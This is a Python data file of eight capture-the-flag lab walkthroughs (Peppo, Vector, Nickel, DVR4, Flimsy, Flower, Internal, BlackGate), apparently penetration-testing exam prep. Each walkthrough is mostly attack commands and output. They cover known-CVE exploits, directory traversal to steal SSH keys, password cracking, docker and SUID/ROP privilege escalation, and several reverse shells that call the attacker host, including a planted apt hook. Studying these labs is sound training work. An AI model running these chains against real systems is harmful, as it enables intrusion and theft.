# Peppo, Vector, Nickel, DVR4, Flimsy, Flower, Internal, BlackGate. Loaded by build_guides.py.
# Uses the P, C, O, L, W, F helpers from build_guides.py, which runs this file.
# Labs not on TJ Null's list carry a 'lab' entry so they show up in the catalogue.

peppo = {
  'title': 'Linux · ident → rbash escape → docker → root',
  'lab': {'name': 'Peppo', 'platform': 'PG Practice', 'os': 'Linux'},
  'ips': {'K': '192.168.45.180', 'T': '192.168.92.60'},
  'steps': [
    {'h': 'Recon', 'b': [
      C('sudo nmap -p- {T} -oN peppo_ports.txt'),
      O('22/tcp  open ssh\n113/tcp open ident\n5432/tcp open postgresql\n8080/tcp open http-proxy\n10000/tcp open snet-sensor-mgmt')]},
    {'h': 'ident leaks a username', 'b': [
      C('sudo nmap -A -p 22,113,5432,8080,10000 {T} -oN peppo_svc.txt'),
      O('22/tcp    |_auth-owners: root\n8080/tcp  WEBrick 1.4.2  |_http-title: Redmine\n10000/tcp |_auth-owners: eleanor'),
      P('The `auth-owners` check asks ident which user runs each service. Port 10000 is run by **eleanor**.')]},
    {'h': 'Foothold: username as password', 'b': [
      C('ssh eleanor@{T}\n# password: eleanor'),
      P('🔑 Login: **eleanor : eleanor**')]},
    {'h': 'Restricted shell (rbash)', 'b': [
      C('echo $PATH\nls bin'),
      O('/home/eleanor/bin\nchmod chown ed ls mv ping sleep touch')]},
    {'h': 'Escape with ed + local.txt', 'b': [
      C('ed\n!/bin/sh\nexport PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin\nid\ncat /home/eleanor/local.txt'),
      O('uid=1000(eleanor) ... 999(docker)'),
      F('local.txt captured')]},
    {'h': 'Privesc: docker mounts the host FS', 'b': [
      C('docker images\ndocker run -v /:/mnt --rm -it redmine chroot /mnt sh\nid\ncat /root/proof.txt'),
      O('uid=0(root) gid=0(root)'),
      F('proof.txt captured 👑')]},
  ],
  'takeaways': [
    '👤 If port **113** is open, use `nmap -sC` or `ident-user-enum` to get usernames.',
    '🔑 For a new user, try the **username as the password** first.',
    '🧱 In rbash, look up each `~/bin` binary on GTFOBins: here `ed` gives `!/bin/sh`.',
    '🛣️ Fix **PATH** after you escape.',
    '🐳 The **docker group** equals root. Use an image the box already has (`docker images`).'],
}

vector = {
  'title': 'Windows · Padding oracle → RDP → backup.rar → Administrator',
  'lab': {'name': 'Vector', 'platform': 'PG Practice', 'os': 'Windows'},
  'ips': {'K': '192.168.45.180', 'T': '192.168.120.159'},
  'steps': [
    {'h': 'Recon', 'b': [
      C('sudo nmap -p- {T} -oN vector_ports.txt\nsudo nmap -sV -p 2290 {T} -oN vector_svc.txt'),
      O('21 ftp | 80 http | 135 | 139 | 445 | 2290 http IIS 10.0 | 3389 rdp | 5985 winrm')]},
    {'h': 'Web app on 2290: find the oracle', 'b': [
      C("curl http://{T}:2290/?c=test\ncurl -s http://{T}:2290/?c=test | grep -A3 '<!--'"),
      O("0\nAES-256-CBC-PKCS7 ciphertext: 4358b2f7...c59488\nVictor's TODO: Need to add authentication eventually.."),
      P('The real ciphertext returns **1** and junk returns **0**, so the page tells you whether the padding is valid. That is a **padding oracle**, and the comment gives the user **victor**.'),
      W('Copy the ciphertext from **your own** page source.')]},
    {'h': 'How it works', 'b': [
      L('First 16 bytes are the IV, last 16 are the cipher block. Each IV byte changes the matching plaintext byte.',
        'Zero IV bytes from the left. The result flips to 0 at byte 13, so the message is 12 bytes with padding `04040404`.',
        'Recover one byte at a time from the right: `plain = guess ^ pad ^ orig_iv`.')]},
    {'h': 'Exploit: padding-oracle script', 'b': [
      P('A short Python script asks the oracle (`/?c=<iv><block>`) whether each guess gives valid padding, recovering the plaintext byte by byte. Run it against your copied ciphertext:'),
      C('python3 po.py {T} 2290'),
      O('[+] WormAloeVat7'),
      P('🔑 Login: **victor : WormAloeVat7**')]},
    {'h': 'RDP as victor + local.txt', 'b': [
      C('xfreerdp /v:{T}:3389 /u:victor /p:WormAloeVat7 /cert:ignore'),
      C('type C:\\Users\\victor\\Desktop\\local.txt\ncopy C:\\Users\\victor\\Downloads\\backup.rar C:\\FTPRoot\\backup.rar', 'cmd'),
      F('local.txt captured')]},
    {'h': 'Pull backup.rar over FTP', 'b': [
      C('ftp {T}\n# victor / WormAloeVat7\nbinary\nget backup.rar\nquit'),
      W('Type `binary` first. ASCII mode corrupts the RAR file.')]},
    {'h': "Open the RAR with victor's password", 'b': [
      C('unrar e backup.rar\n# password: WormAloeVat7\ncat backup.txt | base64 -d'),
      O('Administrator:EverywayLabelWrap375')]},
    {'h': 'Administrator + proof.txt', 'b': [
      C("evil-winrm -i {T} -u Administrator -p 'EverywayLabelWrap375'"),
      C('type C:\\Users\\Administrator\\Desktop\\proof.txt', 'cmd'),
      F('proof.txt captured 👑')]},
  ],
  'takeaways': [
    '👀 Always **view the page source**: here the comments leaked the cipher, ciphertext and a username.',
    '🔐 AES-CBC with no integrity check + a 0/1 answer = **padding oracle**: read plaintext without the key.',
    '♻️ Try each recovered password on **RDP, WinRM, FTP** and any archives.',
    '📦 A writable FTP folder copies files out easily. Use **binary** mode.',
    '🧾 Base64 ending in `==` inside a backup should be decoded right away.'],
}

nickel = {
  'title': 'Windows · POST leaks creds → PDF → SSH tunnel → SYSTEM',
  'ips': {'K': '192.168.118.11', 'T': '192.168.120.209'},
  'steps': [
    {'h': 'Recon', 'b': [
      C('sudo nmap -p- {T} -oN nickel_ports.txt\nsudo nmap -A -p 8089,33333 {T} -oN nickel_svc.txt'),
      O('21 ftp | 22 ssh | 135 | 139 | 3389 | 8089 http HTTPAPI | 33333 http HTTPAPI')]},
    {'h': 'DevOps dashboard', 'b': [
      C('curl http://{T}:8089\ncurl http://{T}:33333/list-running-procs'),
      O('<form action=\'http://{T}:33333/list-running-procs\' method=\'GET\'>\n<p>Cannot "GET" /list-running-procs</p>'),
      P('💡 "Cannot GET" means the page wants another method, so try **POST**.')]},
    {'h': 'Foothold: POST leaks the login', 'b': [
      C("curl -s -X POST -H 'Content-Length: 0' http://{T}:33333/list-running-procs\necho Tm93aXNlU2xvb3BUaGVvcnkxMzkK | base64 -d"),
      O('DevTasks.exe ... --user ariah -p "Tm93...MzkK" --protocol ssh\nNowiseSloopTheory139'),
      P('🔑 Login: **ariah : NowiseSloopTheory139**')]},
    {'h': 'SSH + local.txt', 'b': [
      C('ssh ariah@{T}'),
      C('type C:\\Users\\ariah\\Desktop\\local.txt', 'cmd'),
      F('local.txt captured')]},
    {'h': 'Crack Infrastructure.pdf', 'b': [
      C('ftp {T}\n# ariah / NowiseSloopTheory139\nbin\nget Infrastructure.pdf\nquit\npdf2john Infrastructure.pdf | tee pdf_hash\njohn pdf_hash --wordlist=/usr/share/wordlists/rockyou.txt'),
      O('ariah4168        (Infrastructure.pdf)\nTemporary Command endpoint: http://nickel/?')]},
    {'h': 'Port 80 only works locally: tunnel it', 'b': [
      C('netstat -an | findstr LISTENING', 'cmd'),
      O('TCP    0.0.0.0:80     0.0.0.0:0    LISTENING'),
      P('On Kali, forward it and test:'),
      C('sudo ssh -L 80:127.0.0.1:80 ariah@{T}\ncurl http://localhost/?whoami'),
      O('<pre>nt authority\\system</pre>')]},
    {'h': 'SYSTEM shell + proof.txt', 'b': [
      C("msfvenom -p windows/x64/shell_reverse_tcp LHOST={K} LPORT=443 -f exe -o payload.exe\nscp payload.exe ariah@{T}:C:/Users/ariah/Desktop/payload.exe\nsudo rlwrap nc -nlvp 443\ncurl -G 'http://localhost/?' --data-urlencode 'cmd /c C:\\Users\\ariah\\Desktop\\payload.exe'"),
      C('type C:\\Users\\Administrator\\Desktop\\proof.txt', 'cmd'),
      F('proof.txt captured 👑'),
      P("💡 To skip the shell: `--data-urlencode 'net localgroup Administrators ariah /add'`.")]},
  ],
  'takeaways': [
    '📮 "Cannot GET" means try **POST** with `-H \'Content-Length: 0\'`.',
    '🧾 Process command lines leak secrets, and base64 there is usually a password.',
    '🔒 Locked PDF/ZIP/RAR: use the matching **\\*2john** tool, then rockyou.',
    '🔌 Always run `netstat -an`: firewalled ports are good privesc targets.',
    '🚇 With an SSH login, `ssh -L` brings any internal port to Kali.'],
}

dvr4 = {
  'title': 'Windows · Argus DVR traversal → SSH key → runas Administrator',
  'ips': {'K': '192.168.118.14', 'T': '192.168.120.239'},
  'steps': [
    {'h': 'Recon', 'b': [
      C('sudo nmap -sC -sV {T} -oN dvr4_nmap.txt'),
      O('22/tcp open ssh  Bitvise WinSSHD 8.48\n8080/tcp open http |_http-title: Argus Surveillance DVR'),
      P('About.html shows **version 4.0**; Users.html lists **Administrator** and **Viewer**.')]},
    {'h': 'Exploit search', 'b': [
      C('searchsploit Argus Surveillance DVR 4.0'),
      O('Weak Password Encryption  | windows/local/50130.py\nDirectory Traversal       | windows_x86/webapps/45296.txt')]},
    {'h': 'Directory traversal test', 'b': [
      P('The CGI RESULTPAGE parameter is vulnerable. Read a known file first to confirm:'),
      C('curl "http://{T}:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=../../../../../../../../../../../../../../../../Windows/system.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="'),
      O('; for 16-bit app support\n[386Enh]'),
      W('Each `../` is URL-encoded as `..%2F` in the real request.')]},
    {'h': "Foothold: read viewer's SSH key", 'b': [
      P('Point the same traversal at `Users/viewer/.ssh/id_rsa`, save it, and log in:'),
      C('curl "http://{T}:8080/WEBACCOUNT.CGI?...RESULTPAGE=..%2F..%2F...%2FUsers%2Fviewer%2F%2Essh%2Fid_rsa..." > id_rsa\nchmod 600 id_rsa\nssh -i id_rsa viewer@{T}'),
      C('whoami\ntype C:\\Users\\viewer\\Desktop\\local.txt', 'cmd'),
      O('dvr4\\viewer'),
      F('local.txt captured')]},
    {'h': 'Find the admin password', 'b': [
      C('type "C:\\ProgramData\\PY_Software\\Argus Surveillance DVR\\DVRParams.ini" | findstr /i "LoginName Password"', 'cmd'),
      O('LoginName0=Administrator\nPassword0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8')]},
    {'h': 'Decode it with EDB-50130', 'b': [
      C('searchsploit -m 50130\n# set pass_hash in 50130.py to the value above\npython3 50130.py'),
      O('1 4 W a t c h D 0 g   +  D9A8:Unknown'),
      P('The script can\'t name special characters. Make a test user in the web UI with a one-character password, read the INI again, and you learn **`$` = D9A8**.'),
      P('🔑 Login: **Administrator : 14WatchD0g$**')]},
    {'h': 'Administrator via runas + proof.txt', 'b': [
      P('SSH as Administrator is denied, so use runas from viewer\'s session. On Kali:'),
      C('cp /usr/share/windows-resources/binaries/nc.exe .\npython3 -m http.server 80\nrlwrap nc -lvnp 443'),
      P('In the SSH session:'),
      C('mkdir C:\\temp\npowershell -c "iwr http://{K}/nc.exe -OutFile C:\\temp\\nc.exe"\nrunas /env /profile /user:DVR4\\Administrator "C:\\temp\\nc.exe -e cmd.exe {K} 443"\n# password: 14WatchD0g$', 'cmd'),
      O('dvr4\\administrator'),
      C('type C:\\Users\\Administrator\\Desktop\\proof.txt', 'cmd'),
      F('proof.txt captured 👑')]},
  ],
  'takeaways': [
    '📚 Read **every searchsploit result** for the version: one was the foothold, another the privesc.',
    '🔑 If you can read files and SSH is open, grab `C:/Users/<user>/.ssh/id_rsa`.',
    '🗂️ Config files under `C:\\ProgramData` often hold passwords.',
    '🔣 If hash-identifier can\'t name a "hash", it may be an **encoding**. Set known passwords and compare.',
    '🏃 If SSH denies Administrator, use `runas /user:HOST\\Administrator` from an SSH session.'],
}

flimsy = {
  'title': 'Linux · APISIX CVE-2022-24112 → apt Pre-Invoke cron → root',
  'lab': {'name': 'Flimsy', 'platform': 'PG Practice', 'os': 'Linux'},
  'ips': {'K': '192.168.29.24', 'T': '192.168.29.73'},
  'steps': [
    {'h': 'Recon: scan every port', 'b': [
      C('echo "{T} flimsy.com" | sudo tee -a /etc/hosts\nnmap -Pn -p- -sV -sC -oN flimsy_full.txt flimsy.com'),
      O('22 ssh | 80 nginx | 3306 mysql | 8080 Tomcat 7.0.76\n43500/tcp open http  OpenResty web app server'),
      P('💡 A default scan misses port **43500**; ports 80 and 8080 are dead ends.')]},
    {'h': 'Identify APISIX and its version', 'b': [
      C('curl http://flimsy.com:43500/\ncurl -I http://flimsy.com:43500/'),
      O('{"error_msg":"404 Route Not Found"}\nServer: APISIX/2.8'),
      P('APISIX 2.8 is vulnerable to **CVE-2022-24112** (1.3–2.12.1): the batch-requests feature lets you spoof `X-Real-IP: 127.0.0.1`, and the admin key is the default. Together you can add a route that runs `os.execute`.')]},
    {'h': 'Foothold: the exploit', 'b': [
      C('rlwrap nc -lvnp 445\ngit clone https://github.com/M4xSec/Apache-APISIX-CVE-2022-24112\ncd Apache-APISIX-CVE-2022-24112\npython3 apisix-exploit.py http://flimsy.com:43500/ {K} 445'),
      O('whoami\nfranklin'),
      C('python -c \'import pty;pty.spawn("/bin/bash")\'\ncat /home/franklin/local.txt'),
      F('local.txt captured')]},
    {'h': 'Privesc: check cron', 'b': [
      C('cat /etc/crontab\nls -ld /etc/apt/apt.conf.d'),
      O('* * * * * root apt-get update\ndrwxrwxrwx. 1 root root ... /etc/apt/apt.conf.d')]},
    {'h': 'Root via apt Pre-Invoke + proof.txt', 'b': [
      C('rlwrap nc -lvnp 1234'),
      P('On the target, drop a hook that runs on the next `apt-get update`:'),
      C('cd /etc/apt/apt.conf.d\necho \'APT::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {K} 1234 >/tmp/f"};\' > shell'),
      O('# whoami\nroot    (within about a minute)'),
      C('cat /root/proof.txt'),
      W('The listener port must match the port in the hook.'),
      F('proof.txt captured 👑')]},
  ],
  'takeaways': [
    '🔍 Always scan all ports with `-p-`; the way in was on **43500**.',
    '🌐 Search the web for unusual error messages: this JSON one points to APISIX.',
    '🏷️ `curl -I` shows the exact version in the **Server** header.',
    '📦 A root `apt-get` cron + writable `/etc/apt/apt.conf.d` gives root through a **Pre-Invoke** hook.',
    '⏰ Check `/etc/crontab` and run **pspy** early.'],
}

flower = {
  'title': 'Linux · exposed .git → TinyFileManager RCE → SUID overflow → root',
  'lab': {'name': 'Flower', 'platform': 'PG Practice', 'os': 'Linux'},
  'ips': {'K': '192.168.120.3', 'T': '192.168.58.121'},
  'steps': [
    {'h': 'Recon', 'b': [
      C('nmap -p- -sV {T} -oN flower_ports.txt\necho "{T} flower.pg" | sudo tee -a /etc/hosts'),
      O('22 ssh | 80 http   <title>Welcome to flower.pg!</title>')]},
    {'h': 'vhost fuzzing', 'b': [
      C('ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://flower.pg/ -H "Host: FUZZ.flower.pg" -fw 104 -o flower_vhosts.md -of md\necho "{T} files.flower.pg" | sudo tee -a /etc/hosts'),
      O('files   [Status: 200, Size: 11521]   → TinyFileManager')]},
    {'h': 'Exposed .git', 'b': [
      C('ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u "http://files.flower.pg/FUZZ" -o flower_dirs.md -of md\ngit-dumper http://files.flower.pg/ flower_git\ncd flower_git\ngit log -p config.php'),
      O(".git  [Status: 301]\n+ 'admin' => '$2y$10$9fI7vPVLpb...8ZahuQK'")]},
    {'h': 'Crack the bcrypt hash', 'b': [
      C("echo '$2y$10$9fI7vPVLpb...8ZahuQK' > hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash"),
      O('myspace4'),
      P('🔑 Login: **admin : myspace4** (TinyFileManager 2.4.3)')]},
    {'h': 'Foothold: EDB-50828', 'b': [
      C('searchsploit -m 50828\n# add the WEB_URL="http://files.flower.pg/" line, then:\nrlwrap bash 50828.sh http://files.flower.pg/ admin myspace4'),
      O('[+] Shell found http://files.flower.pg//shell8679.php\n$> id\nuid=33(www-data)')]},
    {'h': 'Reverse shell', 'b': [
      C("echo 'bash -i >& /dev/tcp/{K}/9000 0>&1' > shell.sh\npython3 -m http.server 80\nrlwrap nc -lvnp 9000"),
      P('In the web shell:'),
      C('curl {K}/shell.sh | bash')]},
    {'h': 'Privesc: custom SUID binary', 'b': [
      C('find / -type f -perm -4000 2>/dev/null\nfile /usr/local/bin/db-backup'),
      O('/usr/local/bin/db-backup: setuid ELF 64-bit ... stripped'),
      P('In Ghidra: `setuid(0)`, a command built from hex constants, then `scanf("%s")` into a **3-byte** buffer, then `system(cmd)`.')]},
    {'h': 'Decode the hardcoded command', 'b': [
      C('echo -n 6c71732e...727375 | xxd -r -p | rev'),
      O('/usr/bin/mysqldump -u lucienne --password=svc-dev2019P4SSw0Rd shop 2>/dev/null > /tmp/shop.sql')]},
    {'h': 'Switch to lucienne', 'b': [
      C('su lucienne\n# password: svc-dev2019P4SSw0Rd\nfind / -name local.txt 2>/dev/null'),
      F('local.txt captured')]},
    {'h': 'Root: overflow into system()', 'b': [
      C("printf '#!/bin/bash\\nchmod u+s /bin/bash\\n' > /tmp/e\nchmod 777 /tmp/e\ndb-backup\ndb-backup\n# at the overwrite? [Yes][No]: prompt type   Yes$(/tmp/e)\nbash -p\ncat /root/proof.txt"),
      O('-rwsr-xr-x 1 root root ... /bin/bash\nbash-5.0# whoami\nroot'),
      W('Run db-backup twice: the prompt only shows when the backup already exists. Type it with no spaces.'),
      F('proof.txt captured 👑')]},
  ],
  'takeaways': [
    '🌐 If the page source shows a domain, add it to /etc/hosts and **fuzz for vhosts**.',
    '🗃️ An exposed `.git` means `git-dumper` then `git log -p`: secrets hide in old commits.',
    '🔐 `$2y$` hashes are **bcrypt**: hashcat `-m 3200`, slow but it cracks.',
    '🛠️ Public exploit scripts often need a URL or path fixed, so read them first.',
    '🧬 A custom SUID binary in `/usr/local/bin` is worth reversing; decode stack strings with `xxd -r -p | rev`.',
    '💥 A tiny scanf buffer next to `system()` lets you overwrite it with `$(cmd)`.'],
}

internal = {
  'title': 'Windows · MS09-050 SMBv2 → direct SYSTEM',
  'lab': {'name': 'Internal', 'platform': 'PG Practice', 'os': 'Windows'},
  'ips': {'K': '192.168.49.103', 'T': '192.168.103.40'},
  'steps': [
    {'h': 'Recon', 'b': [
      P('Server 2008 SP1. The exploit lands as SYSTEM, so there is **no privesc step**.'),
      C('nmap -p- --min-rate 3000 {T} -oN internal_ports.txt'),
      O('53 dns | 135 | 139 | 445 smb | 3389 rdp | 5357 | 49152-49158 rpc')]},
    {'h': 'Fingerprint SMB', 'b': [
      C('nmap -sC -sV -p139,445 {T} -oN internal_smb.txt'),
      O('445/tcp open microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1\n|_ message_signing: disabled')]},
    {'h': 'Check for SMB vulns', 'b': [
      C("nmap --script 'smb-vuln*' -p445 {T} -oN internal_smbvuln.txt"),
      O('| smb-vuln-cve2009-3103:\n|   SMBv2 (CVE-2009-3103, MS Advisory 975497)\n|     State: VULNERABLE')]},
    {'h': 'Exploit MS09-050', 'b': [
      C('msfconsole -q\nuse exploit/windows/smb/ms09_050_smb2_negotiate_func_index\nset RHOSTS {T}\nset LHOST {K}\nrun', 'msf'),
      O('[*] Waiting up to 180 seconds for exploit to trigger...\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM'),
      W('It can take up to 3 minutes. If it fails, revert the box: a failed try can crash SMB.')]},
    {'h': 'proof.txt', 'b': [
      C('shell\nwhoami\ntype C:\\Users\\Administrator\\Desktop\\proof.txt', 'cmd'),
      F('proof.txt captured 👑')]},
    {'h': 'Without Metasploit', 'b': [
      C('searchsploit ms09-050\nmsfvenom -p windows/shell_reverse_tcp LHOST={K} LPORT=443 EXITFUNC=thread -f python -v shell\nnc -lvnp 443'),
      P('Paste the generated shellcode into the python PoC from searchsploit, then run it against {T}. Most copies need python2.')]},
  ],
  'takeaways': [
    '🏷️ Note the exact OS build: **6001 SP1** means a Server 2008-era bug.',
    '🔎 On old Windows, always run `nmap --script \'smb-vuln*\' -p445`.',
    '🗓️ Which bug fits which OS: **MS08-067** XP/2003, **MS09-050** Vista/2008, **MS17-010** Win7/2008 R2/2012.',
    '👑 An RCE in the kernel or a service gives SYSTEM, so there is no privesc step.',
    '🎯 You may only use Metasploit on one exam machine, so know the manual way too.'],
}

blackgate = {
  'title': 'Linux · Redis rogue server → sudo redis-status ROP → root',
  'lab': {'name': 'BlackGate', 'platform': 'PG Practice', 'os': 'Linux'},
  'ips': {'K': '192.168.118.23', 'T': '192.168.120.118'},
  'steps': [
    {'h': 'Recon', 'b': [
      C('nmap -sV -p- -Pn {T} -oN blackgate_ports.txt'),
      O('22/tcp open ssh    OpenSSH 8.3p1 Ubuntu\n6379/tcp open redis  Redis 4.0.14')]},
    {'h': 'Redis needs no password', 'b': [
      C('redis-cli -h {T}\nping\nINFO SERVER'),
      O('PONG\nredis_version:4.0.14')]},
    {'h': 'Foothold: rogue-server RCE', 'b': [
      C('git clone https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server\ncd Awsome-Redis-Rogue-Server\npython3 redis_rogue_server.py -rhost {T} -lhost {K}\n# choose: i\nrlwrap nc -lvnp 4422'),
      P('In the module shell:'),
      C('bash -c \'bash -i >& /dev/tcp/{K}/4422 0>&1\''),
      O('prudence@blackgate:/tmp$')]},
    {'h': 'SSH key + local.txt', 'b': [
      C("ssh-keygen -t rsa -f ./bg_key -N ''\ncat bg_key.pub"),
      P('On the target, add the public key:'),
      C('mkdir -p ~/.ssh\necho \'PASTE_bg_key.pub\' >> ~/.ssh/authorized_keys\nchmod 600 ~/.ssh/authorized_keys\ncat ~/local.txt'),
      C('ssh -i bg_key prudence@{T}'),
      F('local.txt captured')]},
    {'h': 'Privesc: enumerate', 'b': [
      C('sudo -l'),
      O('(root) NOPASSWD: /usr/local/bin/redis-status')]},
    {'h': 'Reverse redis-status', 'b': [
      C('scp -i bg_key prudence@{T}:/usr/local/bin/redis-status .\ngdb -q ./redis-status\ndisas main'),
      O('call gets@plt   ; buffer at rbp-0x100'),
      P('💡 The bug is **gets()**: offset = 0x100 + 8 = **264**. NX on, PIE off, so use **ROP**.')]},
    {'h': 'Gadgets', 'b': [
      C("checksec redis-status\nropper --file redis-status --search 'pop rdi; ret'\nreadelf -S redis-status | grep -A1 bss"),
      O('0x4012e3: pop rdi; ret;   |  .bss 0x404050 (WA)\ngets@plt 0x4010d0  |  system@plt 0x4010a0')]},
    {'h': 'Build the payload (on the target)', 'b': [
      P('Pad 264 bytes, then chain `pop rdi; ret` + gets@plt to write "/bin/sh" into .bss, then `pop rdi` + system@plt on that address:'),
      C('python3 build_payload.py > /tmp/xploit.txt'),
      W('If it crashes inside system(), add the `ret` gadget `q(0x4012e4)` right before `q(system)`.')]},
    {'h': 'Root + proof.txt', 'b': [
      C('(cat /tmp/xploit.txt; cat -) | sudo /usr/local/bin/redis-status\n/bin/sh\nid\ncat /root/proof.txt'),
      O('uid=0(root) gid=0(root)'),
      P('💡 Shortcut: Ubuntu 20.10 / kernel 5.8 is often open to PwnKit (CVE-2021-4034). Check `ls -l /usr/bin/pkexec`.'),
      F('proof.txt captured 👑')]},
  ],
  'takeaways': [
    '🗄️ Redis on 6379 with no password, version 4.x/5.x → **rogue-server** module RCE.',
    '🔑 Module shells are limited: switch to a reverse shell, then add an SSH key.',
    '🧩 If sudo allows a custom binary, copy it to Kali and reverse it (`disas main`, `x/s`).',
    '💥 `gets()` means an overflow. Offset = buffer size + 8.',
    '⛓️ NX on, PIE off: chain `pop rdi; ret` with gets@plt to write "/bin/sh", then call system@plt.',
    '🔁 `(cat payload; cat -) | sudo BIN` keeps the shell open.'],
}

BATCH3 = {'pgp-peppo': peppo, 'pgp-vector': vector, 'pgp-nickel': nickel, 'pgp-dvr4': dvr4,
          'pgp-flimsy': flimsy, 'pgp-flower': flower, 'pgp-internal': internal, 'pgp-blackgate': blackgate}
